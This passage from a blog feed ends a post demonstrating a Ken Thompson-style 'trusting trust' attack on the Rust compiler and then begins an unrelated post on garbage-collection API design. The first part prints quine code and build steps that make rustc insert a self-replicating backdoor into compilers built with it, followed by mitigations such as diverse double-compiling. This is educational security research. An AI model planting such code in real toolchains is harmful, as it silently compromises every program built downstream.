</span><span class='line'>  <span class="o">|</span>     <span class="o">^^^^^^^^^^^^^^</span> <span class="n">Maybe</span> <span class="n">a</span> <span class="n">missing</span> <span class="err">`</span><span class="k">extern</span> <span class="n">crate</span> <span class="n">foo</span><span class="p">;</span><span class="err">`</span><span class="o">?</span>
</span><span class='line'>
</span><span class='line'><span class="n">error</span><span class="o">:</span> <span class="n">aborting</span> <span class="n">due</span> <span class="n">to</span> <span class="n">previous</span> <span class="n">error</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is exactly what we expected! We inserted the code <code>use foo::bar::blah;</code>, which isn&rsquo;t going to
resolve, and thus got a failure when compiling the crate the second time around.</p>

<p>Let&rsquo;s add the code for the quineyness and for inserting the <code>fold_crate</code> call:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">fn</span> <span class="n">fold_mod</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">m</span><span class="o">:</span> <span class="n">Mod</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Mod</span> <span class="p">{</span>
</span><span class='line'>    <span class="kd">let</span> <span class="n">new_items</span> <span class="o">=</span> <span class="n">m</span><span class="p">.</span><span class="n">items</span><span class="p">.</span><span class="n">move_flat_map</span><span class="p">(</span><span class="o">|</span><span class="n">item</span><span class="o">|</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// look for the phase_2_configure_and_expand function</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">item</span><span class="p">.</span><span class="n">ident</span><span class="p">.</span><span class="n">name</span><span class="p">.</span><span class="n">as_str</span><span class="p">()</span> <span class="o">==</span> <span class="s">&quot;phase_2_configure_and_expand&quot;</span> <span class="p">{</span>
</span><span class='line'>            <span class="c1">// construct the code for the module contents as described earlier</span>
</span><span class='line'>            <span class="kd">let</span> <span class="n">code_for_module</span> <span class="o">=</span> <span class="s-Raw">r###&quot;mod trust { static SELF_STRING: &amp;&#39;static str = r##&quot;###</span><span class="p">.</span><span class="n">to_string</span><span class="p">()</span> <span class="o">+</span> <span class="s-Raw">r###&quot;##&quot;&quot;###</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s-Raw">r###&quot;&quot;##&quot;###</span> <span class="o">+</span> <span class="s-Raw">r###&quot;##;&quot;###</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;}&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="c1">// Parse it into an AST by creating a crate only containing that code</span>
</span><span class='line'>            <span class="kd">let</span> <span class="n">new_crate</span> <span class="o">=</span> <span class="n">parse_crate_from_source_str</span><span class="p">(</span><span class="s">&quot;trust&quot;</span><span class="p">.</span><span class="n">into</span><span class="p">(),</span>
</span><span class='line'>                                                        <span class="n">code_for_module</span><span class="p">,</span>
</span><span class='line'>                                                        <span class="o">&amp;</span><span class="bp">self</span><span class="p">.</span><span class="n">sess</span><span class="p">.</span><span class="n">parse_sess</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
</span><span class='line'>            <span class="c1">// extract the AST of the contained module</span>
</span><span class='line'>            <span class="kd">let</span> <span class="n">inner_mod</span> <span class="o">=</span> <span class="n">new_crate</span><span class="p">.</span><span class="n">module</span><span class="p">.</span><span class="n">items</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">clone</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>            <span class="c1">// now to insert the fold_crate() call</span>
</span><span class='line'>            <span class="kd">let</span> <span class="n">item</span> <span class="o">=</span> <span class="n">item</span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">i</span><span class="o">|</span> <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span> <span class="kd">let</span> <span class="n">ItemKind</span><span class="o">::</span><span class="n">Fn</span><span class="p">(..,</span> <span class="k">ref</span> <span class="k">mut</span> <span class="n">block</span><span class="p">)</span> <span class="o">=</span> <span class="n">i</span><span class="p">.</span><span class="n">node</span> <span class="p">{</span>
</span><span class='line'>                    <span class="o">*</span><span class="n">block</span> <span class="o">=</span> <span class="n">block</span><span class="p">.</span><span class="n">clone</span><span class="p">().</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">b</span><span class="o">|</span> <span class="p">{</span>
</span><span class='line'>                        <span class="c1">// create a temporary crate just containing a fold_crate call</span>
</span><span class='line'>                        <span class="kd">let</span> <span class="n">new_crate</span> <span class="o">=</span> <span class="n">parse_crate_from_source_str</span><span class="p">(</span><span class="s">&quot;trust&quot;</span><span class="p">.</span><span class="n">into</span><span class="p">(),</span>
</span><span class='line'>                                                                    <span class="s">&quot;fn trust() {let krate = trust::fold_crate(krate, sess);}&quot;</span><span class="p">.</span><span class="n">into</span><span class="p">(),</span>
</span><span class='line'>                                                                    <span class="o">&amp;</span><span class="bp">self</span><span class="p">.</span><span class="n">sess</span><span class="p">.</span><span class="n">parse_sess</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
</span><span class='line'>                        <span class="c1">// extract the AST from the parsed temporary crate, shove it in here</span>
</span><span class='line'>                        <span class="k">if</span> <span class="kd">let</span> <span class="n">ItemKind</span><span class="o">::</span><span class="n">Fn</span><span class="p">(..,</span> <span class="k">ref</span> <span class="n">blk</span><span class="p">)</span> <span class="o">=</span> <span class="n">new_crate</span><span class="p">.</span><span class="n">module</span><span class="p">.</span><span class="n">items</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">node</span> <span class="p">{</span>
</span><span class='line'>                            <span class="n">b</span><span class="p">.</span><span class="n">stmts</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">blk</span><span class="p">.</span><span class="n">stmts</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">clone</span><span class="p">());</span>
</span><span class='line'>                        <span class="p">}</span>
</span><span class='line'>                        <span class="n">b</span>
</span><span class='line'>                    <span class="p">});</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>                <span class="n">i</span>
</span><span class='line'>            <span class="p">});</span>
</span><span class='line'>            <span class="c1">// yield both the created module and the modified function to move_flat_map</span>
</span><span class='line'>            <span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="n">inner_mod</span><span class="p">,</span> <span class="n">item</span><span class="p">].</span><span class="n">into_iter</span><span class="p">()</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="n">item</span><span class="p">].</span><span class="n">into_iter</span><span class="p">()</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">});</span>
</span><span class='line'>    <span class="kd">let</span> <span class="n">m</span> <span class="o">=</span> <span class="n">Mod</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">inner</span><span class="o">:</span> <span class="n">m</span><span class="p">.</span><span class="n">inner</span><span class="p">,</span>
</span><span class='line'>        <span class="n">items</span><span class="o">:</span> <span class="n">new_items</span><span class="p">,</span>
</span><span class='line'>    <span class="p">};</span>
</span><span class='line'>    <span class="n">noop_fold_mod</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>#</code>s let us specify &ldquo;raw strings&rdquo; in Rust, where I can freely include other quotation marks
without needing to escape things. For a string starting with <code>n</code> pound symbols, we can have raw
strings with up to <code>n - 1</code> pound symbols inside it. The <code>SELF_STRING</code> is declared with four pound
symbols, and the code in the trust module only uses raw strings with three pound symbols. Since the
code needs to generate the declaration of <code>SELF_STRING</code> (with four pound symbols), we manually
concatenate extra pound symbols on &ndash; a 4-pound-symbol raw string will not be valid within a three-
pound-symbol raw string since the parser will try to end the string early. So we don&rsquo;t ever directly
type a sequence of four consecutive pound symbols in the code, and instead construct it by
concatenating two pairs of pound symbols.</p>

<p>Ultimately, the <code>code_for_module</code> declaration really does the same as:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">code_for_module</span> <span class="o">=</span> <span class="s">&quot;mod trust { static SELF_STRING: &amp;&#39;static str = </span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\&quot;</span><span class="s">;&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;}&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>conceptually, but also ensures that things stay escaped. I could get similar results by calling into
a function that takes a string and inserts literal backslashes at the appropriate points.</p>

<p>To update <code>SELF_STRING</code>, we just need to include all the code inside the <code>trust</code> module after the
declaration of <code>SELF_STRING</code> itself inside the string. I won&rsquo;t include this inline since it&rsquo;s big,
but <a href="https://github.com/Manishearth/rust/blob/rusting-trust/src/librustc_driver/driver.rs#L541">this is what it looks like in the end</a>.</p>

<p>If we try compiling this code to stage 2 after updating <code>SELF_STRING</code>, we will get errors about
duplicate <code>trust</code> modules, which makes sense because we&rsquo;re actually already compiling an already-
backdoored version of the Rust source code. While we could set up two Rust builds, the easiest way
to verify if our attack is working is to just use <code>#[cfg(stage0)]</code> on the trust module and the
<code>fold_crate</code> call<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup>. These will only get included during &ldquo;stage 0&rdquo; (when it compiles the stage 1
compiler<sup id="fnref:6"><a href="#fn:6" rel="footnote">6</a></sup>), and not when it compiles the stage 2 compiler, so if the stage 2 compiler still
backdoors executables, we&rsquo;re done.</p>

<p>On building the stage 2 (<code>make rustc-stage2</code>) compiler,</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>rustup run stage2 rustc test.rs
</span><span class='line'><span class="nv">$ </span>./test
</span><span class='line'>เคเคเคพเคฒเคพ เคจเคฎเคธเฅเคเคพเคฐ
</span></code></pre></td></tr></table></div></figure>


<p>I was also able to make it work with a separate clone of Rust:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span><span class="nb">cd</span> /path/to/new/clone
</span><span class='line'><span class="c"># Tell rustup to use our backdoored stage1 compiler whenever rustc is invoked</span>
</span><span class='line'><span class="c"># from anywhere inside this folder.</span>
</span><span class='line'><span class="nv">$ </span>rustup override <span class="nb">set </span>stage1 <span class="c"># Works with stage 2 as well.</span>
</span><span class='line'>
</span><span class='line'><span class="c"># with --enable-local-rust, instead of the downloaded stage 0 compiler compiling</span>
</span><span class='line'><span class="c"># stage 0 internal libraries (like libsyntax), the libraries from the local Rust get used. Hence we</span>
</span><span class='line'><span class="c"># need to check out a git commit close to our changes. This commit is the parent of our changes,</span>
</span><span class='line'><span class="c"># and is bound to work</span>
</span><span class='line'><span class="nv">$ </span>git checkout bfa709a38a8c607e1c13ee5635fbfd1940eb18b1
</span><span class='line'>
</span><span class='line'><span class="c"># This will make it call `rustc` instead of downloading its own compiler.</span>
</span><span class='line'><span class="c"># We already overrode rustc to be our backdoored compiler for this folder</span>
</span><span class='line'><span class="c"># using rustup</span>
</span><span class='line'><span class="nv">$ </span>./configure --enable-local-rust
</span><span class='line'><span class="c"># build it!</span>
</span><span class='line'><span class="nv">$ </span>make rustc-stage1
</span><span class='line'><span class="c"># Tell rustup about the new toolchain</span>
</span><span class='line'><span class="nv">$ </span>rustup toolchain link other-stage1 /path/to/new/clone/target_dir/stage1
</span><span class='line'><span class="nv">$ </span>rustup run other-stage1 rustc test.rs
</span><span class='line'><span class="nv">$ </span>./test
</span><span class='line'>เคเคเคพเคฒเคพ เคจเคฎเคธเฅเคเคพเคฐ
</span></code></pre></td></tr></table></div></figure>


<p>Thus, a pristine copy of the rustc source has built a compiler infected with the backdoor.</p>

<hr />

<p>So we now have a working trusting trust attack in Rust. What can we do with it? Hopefully nothing!
This particular attack isn&rsquo;t very robust, and while that can be improved upon, building a practical
and resilient trusting trust attack that won&rsquo;t get noticed is a bit trickier.</p>

<p>We in the Rust community should be working on ways to prevent such attacks from being successful, though.</p>

<p>A couple of things we could do are:</p>

<ul>
<li>Work on an alternate Rust compiler (in Rust or otherwise). For a pair of self-hosted compilers, there&rsquo;s a technique called <a href="http://www.acsa-admin.org/countering-trusting-trust-through-diverse-double-compiling/">&ldquo;Diverse Double-Compiling&rdquo;</a> wherein you choose an arbitrary sequence of compilers (something like &ldquo;<code>gcc</code> followed by 3x <code>clang</code> followed by <code>gcc</code>&rdquo; followed by <code>clang</code>), and compile each compiler with the output of the previous one. Difficulty of writing a backdoor that can survive this process grows exponentially.</li>
<li>Try compiling rustc from its ocaml roots, and package up the process into a shell script so that you have reproducible trustworthy rustc builds.</li>
<li>Make rustc builds deterministic, which means that a known-trustworthy rustc build can be compared against a suspect one to figure out if it has been tampered with.</li>
</ul>


<p>Overall trusting trust attacks aren&rsquo;t that pressing a concern since there are many other ways to get
approximately equivalent access with the same threat model. Having the ability to insert any
backdoor into distributed binaries is bad enough, and should be protected against regardless of
whether or not the backdoor is a self-propagating one. If someone had access to the distribution or
build servers, for example, they could as easily insert a backdoor into the <em>server</em>, or place a key
so that they can reupload tampered binaries when they want. Now, cleaning up after these attacks is
easier than trusting trust, but ultimately this is like comparing being at the epicenter of Little
Boy or the Tsar Bomba &ndash; one is worse, but you&rsquo;re atomized regardless, and your mitigation plan
shouldn&rsquo;t need to change.</p>

<p>But it&rsquo;s certainly an interesting attack, and should be something we should at least be thinking
about.</p>

<p><em>Thanks to Josh Matthews, Michael Layzell, Diane Hosfelt, Eevee, and Yehuda Katz for reviewing drafts of this post.</em></p>

<p><small>Discuss: <a href="https://news.ycombinator.com/item?id=13091941">HN</a>, <a href="https://www.reddit.com/r/rust/comments/5g5hib/reflections_on_rusting_trust/">Reddit</a></small></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Of course, <em>this</em> raises the question of whether or not your assembler/OS/loader/processor is backdoored. Ultimately, you have to trust <em>someone</em>, which was partly the point of Thompson&rsquo;s talk.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>The AST turns up in the metadata/debuginfo/error messages, can be inspected from the command line, and in general is very far upstream and affects a number of things (all the other stages in the pipeline). You could write code to strip it out from these during inspection and only have it turn up in the binary, but that is much harder.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>The local variable is called <code>krate</code> because <code>crate</code> is a keyword<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
<li id="fn:4">
<p>Stage 1 takes the downloaded (older) rust compiler and compiles the sources from it. The stage 2 compiler is build when the stage 1 compiler (which is a &ldquo;new&rdquo; compiler) is used to compile the sources again.<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
<li id="fn:5">
<p>Using it on the <code>fold_crate</code> call requires enabling the &ldquo;attributes on statements&rdquo; feature, but that&rsquo;s no big deal &ndash; we&rsquo;re only using the cfgs to be able to test easily; this feature won&rsquo;t actually be required if we use our stage1 compiler to compile a clean clone of the sources.<a href="#fnref:5" rev="footnote">&#8617;</a></p></li>
<li id="fn:6">
<p>The numbering of the stages is a bit confusing. During &ldquo;stage 0&rdquo; (<code>cfg(stage0)</code>), the stage 1 compiler is <em>built</em>. Since you are building the stage 1 compiler, the make invocation is <code>make rustc-stage1</code>. Similarly, during stage 1, the stage 2 compiler is built, and the invocation is <code>make rustc-stage2</code> but you use <code>#[cfg(stage1)]</code> in the code.<a href="#fnref:6" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GC Support in Rust: API Design]]></title>
    <link href="http://manishearth.github.io/blog/2016/08/18/gc-support-in-rust-api-design/"/>
    <updated>2016-08-18T22:57:48-07:00</updated>
    <id>http://manishearth.github.io/blog/2016/08/18/gc-support-in-rust-api-design</id>
    <content type="html"><![CDATA[<p>Recently we (<a href="http://github.com/pnkfelix/">Felix</a>, <a href="https://github.com/nikomatsakis">Niko</a>, and I) have been working on getting compiler-level GC
support for Rust. The plan is to provide a base set of APIs and intrinsics on which GCs can be
built, without including an actual GC itself. This blog post serves as status update and a pre-pre-
rfc on the designs. I&rsquo;m also going to walk through the process of coming up with the current design.
We&rsquo;ll soon be posting more detailed design docs and discussion about some of the unresolved bits.</p>

<p>The motivation behind this is the same as <a href="http://manishearth.github.io/blog/2015/09/01/designing-a-gc-in-rust/">my motivation for writing rust-gc</a>. Firstly,
it makes it possible to integrate with languages which themselves have a GC. Being able to safely
pass around GCd types in Rust is very useful when writing libraries for Node, Python, or Ruby in
Rust.</p>

<p>Secondly, some algorithms are much neater when a GC is involved. Things like persistent
datastructures, for example, are easier to deal with when a GC is involved.
<a href="https://aturon.github.io/blog/2015/08/27/epoch/">There are ways around this requirement</a>, but it&rsquo;s nice to have the full range of
options.</p>

<p>Rust tries to be safe without a GC, and this doesn&rsquo;t change that &mdash; we envision that GCs
in Rust will be rarely used except for some very specific use cases like the ones listed above.</p>

<p>Compiler support isn&rsquo;t strictly necessary for a GC in Rust to be safe. <a href="https://github.com/Manishearth/rust-gc">rust-gc</a> manages to work
without compiler support (except for a <code>#[derive()]</code> plugin). However, there&rsquo;s a lot of manual
tracking of roots involved, which has a much higher cost than compiler-backed GCs. This is
suboptimal &mdash; we want GC support to be as efficient as possible.</p>

<h2>Design goals</h2>

<p>We&rsquo;re considering GCs designed as a <code>Gc&lt;T&gt;</code> object, which, like <a href="https://doc.rust-lang.org/std/rc/struct.Rc.html"><code>Rc&lt;T&gt;</code></a>, can be explicitly
wrapped around a value to move it to the GC heap. A pervasive GC (where every Rust object is GCd) is
an explicit non-goal; if you need a GC <em>everywhere</em> a different language may make more sense. We&rsquo;re
expecting <code>Gc&lt;T&gt;</code> to be used only where needed, much like how <code>Rc&lt;T&gt;</code> is today.</p>

<p>We want this to work well with other Rust abstractions. Things like <code>Vec&lt;Gc&lt;T&gt;&gt;</code> should be
completely legal, for example.</p>

<p>We want implementors to have total freedom in how <code>Gc&lt;T&gt;</code> is represented &ndash; <em>they</em> define the type,
not the compiler. The compiler provides traits and intrinsics which can be used to find the GC
roots. It should be possible for implementors to provide safe APIs for <code>Gc&lt;T&gt;</code>. There will be no
canonical <code>Gc&lt;T&gt;</code> in the stdlib.</p>

<p>We are trying to support multiple GCs in a single binary. This should be a pretty niche thing to
need, but it strengthens the behavior of GCs as libraries (and not magical one-time things like
custom allocators). One possible use case for this is if a library internally uses a GC to run some
algorithm, and this library is used by an application which uses a GC for some other reason (perhaps
to talk to Node). Interacting GCs are hard to reason about, though. The current design leaves this
decision up to the GC designer &mdash; while it is possible to let your GCd object contain objects
managed by a different GC, this requires some explicit extra work. Interacting GCs is a <em>very</em> niche
use case<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>, so if this ability isn&rsquo;t something we&rsquo;re adamant on supporting.</p>

<p>We also would like it to be safe to use trait objects with the GC. This raises some concerns which
I&rsquo;ll address in depth later in this post.</p>

<h2>Core design</h2>

<p>The core idea is to use <a href="http://llvm.org/docs/StackMaps.html">LLVM stack maps</a> to keep track of roots.</p>

<p>In a tracing GC, the concept of a &ldquo;root&rdquo; is basically something which can be directly reached
without going through other GC objects. In our case they will be cases of <code>Gc&lt;T&gt;</code> ending up on the
stack or in non-gc heap boxes which themselves are reachable from the stack. Some examples:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">struct</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">bar</span><span class="o">:</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">Bar</span><span class="o">&gt;</span><span class="p">,</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">Bar</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">inner</span><span class="o">:</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span><span class="p">,</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// `bar` is a root</span>
</span><span class='line'><span class="kd">let</span> <span class="n">bar</span> <span class="o">=</span> <span class="n">Gc</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="n">Bar</span><span class="o">::</span><span class="n">new</span><span class="p">());</span>
</span><span class='line'><span class="c1">// `bar.inner` is not a root, since it can&#39;t be</span>
</span><span class='line'><span class="c1">// accessed without going through `bar`</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// `foo.bar` is a root:</span>
</span><span class='line'><span class="kd">let</span> <span class="n">foo</span> <span class="o">=</span> <span class="n">Foo</span><span class="o">::</span><span class="n">new</span><span class="p">();</span> <span class="c1">// This is a root</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c1">// `inner` is not a root, because it is a borrowed reference</span>
</span><span class='line'><span class="kd">let</span> <span class="n">inner</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">bar</span><span class="p">.</span><span class="n">inner</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// `rooted_bool` is a root, since it is a `Gc&lt;bool&gt;` on the stack</span>
</span><span class='line'><span class="c1">// (cloning has the same behavior as that on `Rc&lt;T&gt;`: it creates a</span>
</span><span class='line'><span class="c1">// new reference to the same value)</span>
</span><span class='line'><span class="kd">let</span> <span class="n">rooted_bool</span> <span class="o">=</span> <span class="n">bar</span><span class="p">.</span><span class="n">inner</span><span class="p">.</span><span class="n">clone</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// `boxed_bar` is a root. While the Gc&lt;Bar&gt; is not on the stack,</span>
</span><span class='line'><span class="c1">// it can be reached without dereferencing another `Gc&lt;T&gt;`</span>
</span><span class='line'><span class="c1">// or passing through a borrowed reference</span>
</span><span class='line'><span class="kd">let</span> <span class="n">boxed_bar</span> <span class="o">=</span> <span class="n">Box</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="n">Gc</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="n">Bar</span><span class="o">::</span><span class="n">new</span><span class="p">()));</span>
</span></code></pre></td></tr></table></div></figure>


<p>When figuring out which objects are live (&ldquo;tracing&rdquo;), we need to have this initial set of &ldquo;roots&rdquo;
which contain the list of things directly reachable from the stack. From here, the GC can rifle
through the fields and subfields of the roots till it finds other GCd objects, which it can mark as
live and continue the process with.</p>

<p>Most runtimes for GCd languages have efficient ways of obtaining this list of roots. Contrast this
with conservative collectors like Boehm, which read in the whole stack and consider anything which
looks like a pointer to the GC heap to be a root. rust-gc&rsquo;s approach is inefficient too; because it
incurs an additional reference counting cost on copying and mutation.</p>

<p>However, the list of current roots is known at compile time; it&rsquo;s just a matter of which variables
are live at any point. We store this list of live variables in a per-call-site &ldquo;stack map&rdquo;. To find
all the roots, you walk up the call stack, and for each call site look up its entry in the stack
map, which will contain the stack offsets of all the roots (and other metadata if we need it). LLVM
has native support for this. The stack map is stored in a separate section so there is no runtime
performance hit during regular execution, however some optimizations may be inhibited by turning on
GC.</p>

<p>So basically a GC will have access to a <code>walk_roots&lt;F&gt;(f: F) where F: FnMut(..)</code> intrinsic that will
yield all the roots to the provided function (which can then mark them as such and start tracing).</p>

<p>I&rsquo;m not going to focus on the implementation of this intrinsic for this blog post &mdash; this might
be the subject of a later blog post by <a href="http://github.com/pnkfelix/">Felix</a> who is working on this.</p>

<p>Instead, I&rsquo;m focusing on the higher-level API.</p>

<h2>Identifying rootables</h2>

<p>The first problem we come across with the design mentioned above is that the compiler doesn&rsquo;t yet
know how to distinguish between a root and a non-root. We can&rsquo;t mark <em>every</em> variable as a root;
that would bloat the stack maps and make walking the roots a very expensive operation.</p>

<p>A very simple way of doing this is via a trait, <code>Root</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// in libcore</span>
</span><span class='line'>
</span><span class='line'><span class="k">unsafe</span> <span class="k">trait</span> <span class="n">Root</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// auto-trait, anything containing</span>
</span><span class='line'><span class="c1">// a Root will itself be Root</span>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span> <span class="o">!</span><span class="n">Root</span> <span class="k">for</span> <span class="p">..</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// references are never roots</span>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="p">,</span> <span class="n">T</span><span class="o">&gt;</span> <span class="o">!</span><span class="n">Root</span> <span class="k">for</span> <span class="o">&amp;</span><span class="n">&#39;a</span> <span class="n">T</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c1">// in a gc impl</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// ..</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">Root</span> <span class="k">for</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{}</span>
</span></code></pre></td></tr></table></div></figure>


<p>if we detect <code>Root</code> objects that are directly reachable, we consider them to be roots.</p>

<p>This has a flaw, it doesn&rsquo;t actually tell us how to find roots inside container types. What would we
do if there was a <code>Box&lt;Gc&lt;T&gt;&gt;</code> or a <code>Vec&lt;Gc&lt;T&gt;&gt;</code> on the stack? We can stick their entry in the stack
map, but the GC needs to know what to do with them!</p>

